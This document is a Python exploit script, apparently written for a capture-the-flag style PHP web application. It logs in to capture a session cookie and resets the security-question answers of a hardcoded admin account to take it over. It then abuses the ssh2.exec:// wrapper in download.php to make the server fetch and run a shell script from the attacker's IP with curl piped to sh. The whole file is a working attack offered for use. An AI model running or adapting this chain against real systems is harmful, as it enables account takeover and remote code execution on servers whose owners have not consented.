#!/usr/bin/env python3
import requests
import sys

def get_cookie(url: str, user: str, passwd: str) -> str | None:
    data: str = "submitted=true&username={}&password={}".format(user, passwd)
    headers: dict = {"Content-Type": "application/x-www-form-urlencoded"}
    try:
        r1 = requests.post(url + "/login.php", data=data, headers=headers, allow_redirects=False)
        cookie: str = r1.cookies.get("PHPSESSID")
        print("Cookie:", cookie)
    except requests.exceptions.RequestException as e:
        print("Error:", e)
        return None
    return cookie

def sub_main(url: str, admin_user: str, cookie: str, a1="hi", a2="hi", a3="hi") -> bool:
    data: str = "username={0}&new_answer1={1}&new_answer2={2}&new_answer3={3}".format(admin_user, a1, a2, a3)
    headers: dict = {"Content-Type": "application/x-www-form-urlencoded",
            "Cookie": "PHPSESSID={}".format(cookie)}
    try:
        r1 = requests.post(url + "/reset.php", data=data, headers=headers)
        if r1.status_code == 200:
            print("*Reseted questions for:", admin_user)
            new_data: str = data.replace("new_", "")
            r2 = requests.post(url + "/security_login.php", data=new_data, headers=headers)
            print("*Logged in with reseted questions")
    except requests.exceptions.RequestException as e:
        print("Error:", e)
        return False
    return True

def main(url: str, user: str, passwd: str, fid: int, ip_addr: str, cookie: str) -> bool:
    payload: str = "id={0}&show=true&format=ssh2.exec://{1}:{2}@127.0.0.1/curl+-s+http://{3}:8000/shell.sh|sh%23".format(fid, user, passwd, ip_addr)
    headers: dict = {"Cookie": "PHPSESSID={}".format(cookie)}
    try:
        print("Starting persistence...")
        r = requests.get(url + "/download.php?" + payload, headers=headers)
    except requests.exceptions.RequestException as e:
        print("Error:", e)
        return False
    return True

if __name__ == "__main__":
    if len(sys.argv) != 6:
        print("Usage:", sys.argv[0], "<url> <username:password> <ssh_username:ssh_password> <your_ip> <file_id>")
        sys.exit(1)

    url: str = sys.argv[1].lstrip("/")
    user, passwd = sys.argv[2].split(":")
    ssh_username, ssh_password = sys.argv[3].split(":")
    ip_addr: str = sys.argv[4]
    fid: int = int(sys.argv[5])

    admin_user: str = "admin_ef01cab31aa"
    cookie: str = get_cookie(url, user, passwd)
    
    if not cookie:
        print("Failed to grab session cookie.")
        sys.exit(1)

    if sub_main(url, admin_user, cookie):
        main(url, ssh_username, ssh_password, fid, ip_addr, cookie)